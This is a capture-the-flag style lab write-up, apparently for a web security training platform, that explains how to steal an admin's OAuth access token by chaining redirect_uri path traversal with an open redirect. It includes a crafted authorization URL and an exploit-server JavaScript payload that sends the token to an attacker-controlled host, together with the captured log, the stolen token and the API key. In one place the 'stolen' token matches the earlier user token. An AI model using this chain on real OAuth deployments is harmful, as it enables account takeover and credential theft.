## Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note :

You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- OAuth Server Domain
- /authenticate
- /social-login
- /oauth-callback
- /me

## Resume

1. Analyze OAuth flow
2. Identify access token handling
3. Discover redirect_uri path traversal
4. Discover open redirect
5. Chain both vulnerabilities
6. Leak victim access token
7. Query /me
8. Retrieve admin API key

## Solve

Log into the application using OAuth while proxying traffic through Burp.

During the OAuth flow, identify the API request made to the OAuth provider:

```http
GET /me HTTP/2
Host: oauth-0aad00a903d3366f81ce5f0502ce00b3.oauth-server.net
Authorization: Bearer wBhLQqzbTbenMTY0gVfODtlJnKD7YGrGH2UyW0QG2ca
```

The response contains user information:

```json
{"sub":"wiener","apikey":"AImSY5T8J5WMEuVnmfEW4cRO6EhJ88Rw","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
```

This confirms that:

OAuth access tokens are accepted by /me
Sensitive information can be retrieved directly from the OAuth provider

Next, inspect the OAuth authorization request.

The application uses a request similar to:

```
/auth?client_id=...&redirect_uri=...
```

Test the redirect_uri parameter for path traversal.

Replace the callback path with:

```
/oauth-callback/../post?postId=1
```

The OAuth flow still succeeds.

This confirms that the OAuth server validates the prefix only and fails to normalize traversal sequences.

After authentication, the browser is redirected to a blog post page while the OAuth access token remains inside the URL fragment.

Next, inspect blog functionality and identify the "Next post" feature:

```html

<div class="is-linkback"> <a href="/">Back to Blog</a> <a href="/post/next?path=/post?postId=4">| Next post</a> </div> 
```

The endpoint:

```
/post/next?path=
```

is vulnerable to open redirect.

For example:

```
/post/next?path=../../my-account
```

or even absolute external URLs are accepted.

This allows chaining both vulnerabilities together:

- Abuse OAuth redirect_uri traversal
- Redirect to vulnerable /post/next
- Redirect victim to exploit server
- Leak OAuth access token fragment

Construct the malicious OAuth URL:

```
https://oauth-0aad00a903d3366f81ce5f0502ce00b3.oauth-server.net/auth?client_id=xzsyy4vnv1vroicxlenid&redirect_uri=https://0a5a004f034236b781a9618800e2006d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8e008003723615819060bb01e30078.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email
```

When visited:

- OAuth authentication completes
- Victim is redirected through the open redirect
- Access token is appended as URL fragment
- Victim lands on exploit server with token in fragment

Now create the exploit server payload:

```html
<script> if (!document.location.hash) { window.location = 'https://oauth-0aad00a903d3366f81ce5f0502ce00b3.oauth-server.net/auth?client_id=xzsyy4vnv1vroicxlenid&redirect_uri=https://0a5a004f034236b781a9618800e2006d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8e008003723615819060bb01e30078.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>
```

This payload works as follows:

First load triggers OAuth flow
OAuth provider redirects victim with fragment:

```
#access_token=...
```

- JavaScript extracts the fragment
- Browser is redirected again using query parameters
- Access token gets written into exploit server logs

After delivering the exploit to the victim, the exploit server access logs contain:

```
10.0.3.54 2026-05-22 13:20:24 +0000 "GET /?access_token=wBhLQqzbTbenMTY0gVfODtlJnKD7YGrGH2UyW0QG2ca&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200
```

The stolen administrator access token is:

```
wBhLQqzbTbenMTY0gVfODtlJnKD7YGrGH2UyW0QG2ca
```

Reuse this token against /me:

```http
GET /me HTTP/2
Host: oauth-0aad00a903d3366f81ce5f0502ce00b3.oauth-server.net
Authorization: Bearer wBhLQqzbTbenMTY0gVfODtlJnKD7YGrGH2UyW0QG2ca
```

The response reveals the administrator API key:

```json
{
"sub":"administrator",
"apikey":"g4ehpGF6CSHBEnY6aXsW58T0cZqDDfTy",
"name":"Administrator",
"email":"administrator@normal-user.net",
"email_verified":true
}
```

Submit:

```
g4ehpGF6CSHBEnY6aXsW58T0cZqDDfTy
```